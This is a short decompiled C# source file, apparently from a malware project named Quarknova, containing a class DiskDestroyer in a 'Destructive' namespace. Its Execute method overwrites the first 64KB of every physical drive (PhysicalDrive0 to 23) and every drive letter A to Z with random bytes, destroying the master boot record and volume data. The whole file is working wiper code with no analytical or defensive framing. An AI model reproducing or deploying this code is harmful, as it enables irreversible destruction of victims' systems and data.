using System;
using System.Text;
using Quarknova.Utilities;

namespace Quarknova.Destructive
{
	// Token: 0x02000009 RID: 9
	internal class DiskDestroyer
	{
		// Token: 0x06000091 RID: 145 RVA: 0x00005714 File Offset: 0x00003914
		public static void Execute()
		{
			for (int i = 0; i < 24; i++)
			{
				byte[] bytes = Encoding.ASCII.GetBytes(Functions.GetRandString(0, 255, 65536));
				string path = string.Format("\\\\.\\PhysicalDrive{0}", i);
				MBR.Overwrite(bytes, path);
			}
			for (int j = 0; j < 26; j++)
			{
				byte[] bytes2 = Encoding.ASCII.GetBytes(Functions.GetRandString(0, 255, 65536));
				string path = string.Format("\\\\.\\{0}:", (char)(65 + j));
				MBR.Overwrite(bytes2, path);
			}
		}
	}
}
